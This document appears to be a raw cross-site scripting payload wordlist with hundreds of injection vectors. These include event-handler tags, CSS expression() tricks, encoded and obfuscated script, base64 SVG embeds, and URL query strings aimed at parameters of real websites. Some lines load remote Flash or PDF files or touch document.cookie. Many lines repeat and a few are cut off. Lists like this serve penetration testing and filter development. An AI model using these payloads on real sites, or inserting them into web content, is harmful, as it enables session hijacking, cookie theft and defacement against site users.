<body/onload=&lt;!--&gt;&#10alert(1)>
<body/onload=&lt;!--&gt;&#10alert(1)>
<body/onload=&lt;!--&gt;&#10alert(1)>
<body/onload=&lt;!--&gt;&#10alert(1)>
<body/onload=&lt;!--&gt;&#10alert(1)>
<body onload=prompt(1);>
<body/onload=self[/loca/.source%2b/tion/.source]=name//
<body/onload=this[/loca/.source%2b/tion/.source]=name//
<body/onload=URL=name//
<body onLoad="while(true) alert('XSS');">
<body/onload=window[/loca/.source%2b/tion/.source]=name//
<body/””$/onload=x={doc:parent[’document’]};x.doc.writeln(1)
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body/onpageshow=alert(1)>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onunload="javascript:alert('XSS');">
<body/s/onload=x={doc:parent.document};x.doc.writeln(1)
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<BR SIZE="&{alert('CrossSiteScripting')}">
<br size="&{alert('XSS')}">
<BR SIZE="&{alert('XSS')}">
<BR SIZE="&{alert('XSS')}">
<BR SIZE="&{alert('XSS')}">
<BR SIZE="&{alert('XSS')}">
<BR SIZE="&{document.cookie=true}">
>"<BR SIZE="&{document.cookie=true}">
<BR SIZE="&{javascript:alert(1)}">
<BR SIZE="&{javascript:alert(1)}">
</br style=a:expression(alert())>
<b <script>alert(1)</script>0
<b <script>alert(1)</script>0
&btnSearch=all&searchText=<script>alert%28%22XSS%22%29</script>
b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
b="URL(\"";
b=\"URL(\\"\";
<button form=x>xss<form id=x action="javas&Tab;cript:alert(1)"//
<button.onclick="alert(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,
&bw=zoek&taal=nl&letter=&zoek3=%22%3E%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29;%3C/script%3E
c
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
&c=10"><script>alert('XSS')</script>
&c1=sg%22%3E%3Cscript%3Ealert%28%22NullCrew%22%29%3C/script%3E
&cat=All&searchText=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&x=0&y=0
&categ=ass&prod=%3Cimg%20src=%22http://a1055.g.akamai.net/f/1055/1401/5h/images.barnesandnoble.com/images/12400000/12403880.jpg%22%3E
&categoryid=529&msg=';alert(String.fromCharCode(71,117,105,100,111,90,32,88,83,83))//\\';alert(String.fromCharCode(71,117,105,100,111,90,32,88,83,83))//";alert(String.fromCharCode(71,117,105,100,111,90,32,88,83,83))//\\";alert(String.fromCharCode(71,117,105,100,111,90,32,88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(71,117,105,100,111,90,32,88,83,83))</SCRIPT>
&catId=%22%3E%3Cbody%20onload=%22alert%28%27XSS%27%29%22%3E&mid=&f=&f=&f=&p=
&cat=M&subcat=S&prodname=<object%20width=480%20height=385><param%20name=movie%20value=http://www.youtube.com/v/OXc5ltzKq3Y
&catText=%3Cscript%3Ealert(document.cookie);%3C/script%3E
charset=utf- 32&v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80
charset=utf-8&v=”><img src=x onerror=prompt(0);>
&ch=Hardware&search=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E
Chrome (Any character \x01 to \x20)
c="javascript:";
c=\"javascript&#058;\";
&clickTAG=http://www.youtube.com/watch
&clicktag=javascript:alert%28/XSSPOSED/%29
&clickTag=javascript:alert%28/XSSPOSED/%29
&clickTAG=javascript:alert%28/xssposed/%29
&clickTAG=javascript:alert%28/XSSPOSED/%29
&clientAccnum=938022&clientSubacc=0000&formName=43cc&language=English'%20STYLE='display:block;position:absolute;top:0;left:0;width:999px;height:999px;'%20onmouseover='alert(/XSS/)&allowedTypes=0000023138:840,0000023139:840,0000000216:840&subscriptionTypeId=0000000216:840
&cmd=browse&project=999999.9%27%22%3E%3CA%20onmouseover=alert%28/XSSPOSED/%29%3EXSS,%20needs%20to%20be%20fixed%20ASAP%3C/a%3E
&cnpage=%22%3E%3Cscript%3E+-+-1-+-+alert%28/XSSPOSED/%29%3C/script%3E
&cn=<script>alert('0');</script>
&cof=FORID%3A9&u=%2F&i=93.96.45.41&cx=007197795867691607395%3Ajdouk1cllf0&q=a%22;alert('xss');x=%22;&sa=Search
&col=&ht=0&qp=&qs=&qc=&pw=100%25&la=en&charset=iso-8859-1&si=1&ws=0&qm=0&ql=&qt=XSS&oldqt=%3Cscript%3E%28alert%29%28%22XSSPOSED%22%29%3C/script%3E
&collection=81"><script>alert(String.fromCharCode(88,83,83))</script>
[color=red' onmouseover="alert('xss')"]mouse over[/color]
[color=red width=expression(alert(123))][color]
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
&config=htdig&amp;restrict=&amp;exclude=&amp;method=and&amp;format=long&amp;sort=score&amp;words=%22%3E%20d%3Csvg/onload=confirm%28/xssposed/%29%3E
[].constructor.constructor("alert" + "(1)")()
&content=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
<% contenteditable onresize=alert(1)>&artistName=and%20courtesy%20of%20Apple%3C/strong%3E%3F%3Ciframe%20src%3D%22http%3A//www.reddit.com/r/xss/new/%22%20width%3D%22643%22%20height%3D%22239%22%20frameborder%3D%220%22%3E%3C/iframe%3E%3Cbr/%3EGood%20job,%20Apple&thumbnailUrl=http%3A//www.fireblog.com/wp-content/uploads/2009/04/xss-threat3.jpg&albumName=XSS%20Exploits
&ContentID=133&SiteID="><script>alert(String.fromCharCode(88,83,83))</script>
&content_selector=gold-platinum-searchable-database&artist=\\'-alert%28String.fromCharCode%2888,83,83%29%29;//
&coursecode=SC&infotype="><script>alert('XSS')</script>
&create=kb:USPSFAQ&search=\\%22;}%3C/script%3E%3Cscript%3Ealert%28%27Hi%20Reddit%27%29;%3C/script%3E&searchProperties=type:natural&naturalAdvance=false&varset%28source%29=sourceType:search
&criteria=%3Cscript%3Ealert(%22XSS!%22);%3C/SCRIPT%3E
'';!--"<CrossSiteScripting>=&{()}
<CrossSiteScripting STYLE="behavior: url(CrossSiteScripting.htc);">
<CrossSiteScripting STYLE="CrossSiteScripting:expression(alert('CrossSiteScripting'))">  exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting("*//*");  CrossSiteScripting:ex&#x2F;*CrossSiteScripting*//*/*/pression(alert("CrossSiteScripting"))'>
<CrossSiteScripting STYLE="CrossSiteScripting:expression(document.cookie=true)">
>"<CrossSiteScripting STYLE="CrossSiteScripting:expression(document.cookie=true)">
&c=SXM_Channel_C&childpagename=SXM%2FSXM_Channel_C%2FChannelDetail&cid=--><script>alert('0');</script>&pagename=SXM%2FWrapper
&customization_result=%22%3E%3Cscript%3Ealert%28/hi/.source%29%3C/script%3E
&cx=003481944941899604444%3Ad947h5mvseo&cof=FORID%3A10&ie=UTF-8&q=%3Cimg+src%3Dhttp%3A%2F%2Fthumbs.reddit.com%2Ft5_2qxe8.png%3Fv%3D60c0bc6ee97246414e7b0738fb0040ef%2F%3E&sa.x=0&sa.y=0&sa=search#262
&cx=008267139695251349397%3A3kau9exrwow&cof=FORID%3A10&ie=UTF-8&q=%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E%3Cinput+type%3D%22text&x=0&y=0
&cx=partner-pub-1783560022203827%3Anpr2q7v5m6t&cof=FORID%3A11&ie=ISO-8859-1&q=%22%3E%3Cimg%20src=http://i.imgur.com/P8mL8.jpg%3E%3Csvg%3E%3Cscript%3E%3C!%3Ealert%28%22XSS%22%29%3C/script%3E
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
d="alert('CrossSiteScripting');\")";
d=\"alert('XSS');\\")\";
&date=%22%3E%3Cscript%3Ealert%28%27xssd%27%29;%3C/script%3E%3Ctextarea%3E
&debug=true&heroOverride=%3Cscript%3Ealert%28%27hax%27%29%3C%2Fscript%3E
&DestAddress=23901%20East%20Orchard%20Road%3Cobject%20data=%22http://dl.dropbox.com/u/1437645/meaningless/flashbomb.swf%22%20type=%22application/x-shockwave-flash%22%3E%3Cparam%20name=%22movie%22%20value=%22http://dl.dropbox.com/u/1437645/meaningless/flashbomb.swf%22%20/%3E%3Cparam%20name=%22allowScriptAccess%22%20value=%22always%22%20/%3E%3Cparam%20name=%22FlashVars%22%20value=%22swfsrc=http://dl.dropbox.com/u/1437645/meaningless/boring.swf%22%20/%3E%3C/object%3E&DestCity=Aurora&DestState=CO&DestPostalCode=80016&DestLat=39.600259&DestLng=-104.711478&DestPhone=%28303%29%20400-4106&DestName=Southlands%20%28Aurora%29&DestNumber=1031&DestCountry=US&OriginStreet=&OriginCity=&OriginState=&OriginPostalCode=80012&OriginCountry=US
&destinationSectionUniqueName=search&publicationName=ind&sortString=publishdate&sortOrder=desc&sectionId=506&articleTypes=news&pageNumber=1&pageLength=10&startDay=1&startMonth=1&startYear=2010&useSectionFilter=true&useHideArticle=true&searchString=awdawd%22;alert('xss');x=%22)
<dialog open="" onclose="alert(1)"><form method="dialog"><button>Close me!</button></form></dialog>
&display=none&hid=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E
<div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>
>"<div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
<div onfocus=alert('xx') id=xss style=display:table>
<div/onmouseover='alert(1)'> style="x:">
<div/onmouseover='alert(1)'> style="x:">
<div/onmouseover='alert(1)'> style="x:">
<div/onmouseover='alert(1)'> style="x:">
<div/onmouseover='alert(1)'> style="x:">
<div/onmouseover='alert(1)'> style="x:">
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<div onmouseover="document.cookie=true;">
>"<div onmouseover="document.cookie=true;">
<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="background-image: url(javascript:alert('CrossSiteScripting'))">
<DIV STYLE="background-image: url(javascript:alert('CrossSiteScripting'))">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<div style="background-image: url(javascript:document.cookie=true;);">
>"<div style="background-image: url(javascript:document.cookie=true;);">
<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
>"<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
>"<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="behaviour: url([link to code]);">
>"<div style="behaviour: url([link to code]);">
<div style="binding: url([link to code]);">
>"<div style="binding: url([link to code]);">
<div style="color:rgb(''&#0;x:expression(alert(1))"></div>
<div style=content:url(%(svg)s)></div>
<div style=content:url(%(svg)s)></div>
<div style="font-family:'foo&#10;;color:red;';">LOL
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div style="font-family:foo}color=red;">XXX
<div style="font-family:foo}color=red;">XXX
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
<div style="-ms-scroll- limit:1px;overflow:scroll;width:1px" onscroll=alert('xss')>
<div style=overflow:-webkit-marquee onscroll=alert(1)>
<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>​
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>?
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<DIV STYLE="width: expression(alert('CrossSiteScripting'));">
<DIV STYLE="width: expression(alert('XSS'));">
<DIV STYLE="width: expression(alert('XSS'));">
<DIV STYLE="width: expression(alert('XSS'));">
<DIV STYLE="width: expression(alert('XSS'));">
<div/style="width:expression(confirm(1))">X</div>
<div/style="width:expression(confirm(1))">X</div> {IE7}
<div/style="width:expression(confirm(1))">X</div> {IE7}
<div/style="width:expression(confirm(1))">X</div> {IE7}
<div/style="width:expression(confirm(1))">X</div> {IE7}
<div style="width: expression(document.cookie=true;);">
>"<div style="width: expression(document.cookie=true;);">
<DIV STYLE="width: expression(document.cookie=true);">
>"<DIV STYLE="width: expression(document.cookie=true);">
<DIV STYLE="width:expression(javascript:alert(1));">
<DIV STYLE="width:expression(javascript:alert(1));">
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:expression(alert(1))">Joker</div>
<div style="x:expression((window.r==1)?'':eval('r=1;
<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />
&DM_NUMBER="><img/onerror=document.write('\\x58\\x53\\x53'); src=./>
>"&{document.cookie=true;};
&{document.cookie=true;};
document.__parent__._=alert
$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
&domain=--><script>alert(1)</script>-->
&domain=<script>alert%28String.fromCharCode%2888,83,83%29%29</script>
--><d/ /ondrag=co\u006efir\u006d(2)>hello.
&dsNav=Ntk:TitleKeyword|%3Cscript%3Ealert%28%27XSS%27%29%3b%3C%2fscript%3E|1|
e
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE
&e=50&i=50_50.gif&p=50%3Cscript%3Ealert('XSS')%3C/script%3E
ë; alert(document.cookie); var foo=í
echo('IPT>alert("CrossSiteScripting")</SCRIPT>'); ?>
echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
<? echo('<SCR)';
<? echo('<scr)'; echo('ipt>alert("XSS")</script>'); ?>
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>
>"<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>
&email=%22%20/%3E%3CSCRIPT%3Ealert%28%22XSS%22%29;%3C/SCRIPT%3E
&email="/><script>alert(0)</script><script>alert(document.cookie)</script>
&email=--></script><script>alert('0');</script>
&email=zead19_2010@hotmail.com&id="><script>alert('XSS')</script>
<embed/code=//goo.gl/nlX0P?
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
<embed code=javascript:javascript:alert(1);></embed>
<embed code=javascript:javascript:alert(1);></embed>
<embed code=%(scriptlet)s></embed>
<embed code=%(scriptlet)s></embed>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<embed src="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed/src=//goo.gl/nlX0P>
<embed/src=”//goo.gl/nlX0P”>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ​
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<EMBED SRC="http://vulnerability-lab.com/CrossSiteScripting.swf" AllowScriptAccess="always"></EMBED>
<embed src="javascript:alert(1)">
<embed src="javascript:alert(1)">
<embed src="javascript:alert(1)">
<embed src=%(jscript)s></embed>
<embed src=%(jscript)s></embed>
<embed type="image" src=%(scriptlet)s></embed>
<embed type="image" src=%(scriptlet)s></embed>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
&entry_id=%22%3E%3Cscript%3Ealert%28/XSSPOSED/%29%3C/script%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E
&eq=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
&err=1&locationTerm=2031'});}catch(err){}alert(0);try{alert(a={'asd':'a
&ErrMsg=%3Cimg%20src=%22http://imgur.com/bTkSe.png%22%20/%3E%3CSCRIPT%3Ealert%28%22xss%22%29%3C/SCRIPT%3E
&error=catalogue.asp
&errorMessage=I%27m%25 20sorry%2C%2520the%2520Password%2520Assistance%2520page%2520is%2520temporarily%2520unavailable.%2520 %2520Please%2520try%2520again%2520in%252015%2520minutes.%3C"<marquee><img src=k onerror=alert("XSS") />
eval(a+b+c+d);
eval("ale" + (!![]+[])[+!+[]]+(!![]+[])[+[]])(1)
eval.call(this,unescape.call(this,location))
eval(name)
_=eval,__=unescape,___=document.URL,_(__(___))
eval(v+l+a+b);
&event=11&broadcastType=1&jspLocation=/jsp/tv_listings_search.jsp&jspError=/jsp/error.jsp&searchString=%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C/SCRIPT%3E%22%3E
<event-source src="%(event)s" onload="javascript:alert(1)">
<event-source src="%(event)s" onload="javascript:alert(1)">
